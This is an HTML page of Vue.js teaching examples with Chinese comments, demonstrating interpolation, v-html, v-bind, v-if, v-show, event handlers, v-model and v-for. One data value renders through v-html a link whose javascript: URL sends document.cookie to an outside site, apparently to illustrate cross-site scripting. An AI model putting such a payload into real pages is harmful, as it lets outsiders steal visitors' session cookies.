<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<title>Examples</title>
<meta name="description" content="">
<meta name="keywords" content="">
<link href="" rel="stylesheet">
<script src="lib/vue.js"></script>

<style>
    .red{
        background: red;
    }

    .yellow{
        background: yellow;
    }
</style>
</head>
<body>

   <div id="box">
      
      <div>{{10+20}}</div>
      <div>
          {{10>20?'aaaa':'bbbb' }}
      </div>

      <div>
        {{ name+'is aaaaa' }}
      </div>

      <div>
        {{ 'name' }}
      </div>

      <div>
        {{ myhtml }}
      </div>


      <div v-html="myhtml">
          <!-- 指令 v-html-->
      </div>




      <div v-bind:class="isMark?'red':'' " > 属性中是一个状态</div>
      <div :class="isMark?'red':'' " > 属性中是一个状态</div>
      
      <img v-bind:src="mysrc"/>


      <div v-if="isCreated">我是动态创建和删除</div>

      <div v-show="isShow">我是动态显示和隐藏</div>


      <button v-on:click="handleKerwinClick()">click11</button>
      <button @click="handleKerwinClick()">click22</button>
   

      用户名:<input type="text" v-model="username"/>
      密码：<input type="password" v-model="password"/>


      <button @click="handleLogin()">登录</button>


      <ul>
        <li v-for="kerwindata in list">
          {{kerwindata}}
        </li>
      </ul>
   </div>

   {{20+20}}

   <script type="text/javascript">
  



    var vm  =  new Vue({
      el:"#box", //el 初始化的节点
     
      data:{    // data 中 定义的状态
        name:"kerwin",

        myhtml:"<a href=javascript:location.href='http://www.baidu.com?cookie='+document.cookie>***和***有事儿</a>",

        isMark:true,

        mysrc: 'https://111.com/',

        isCreated:false,
        isShow:false,

        username:"",
        password:"",


        list:["111","222","333","5555","6666"]
      },

      //方法
      methods:{
        handleKerwinClick:function(){
          console.log("click");

          this.name = "xiaoming";
          this.isMark = !this.isMark;
        },

        handleLogin(){
          console.log(this.username,this.password);
        }
      }
     })


    /*
    
      v-model 双向数据绑定。
  
      适用于 表单元素
     */

   </script>
</body>
</html>
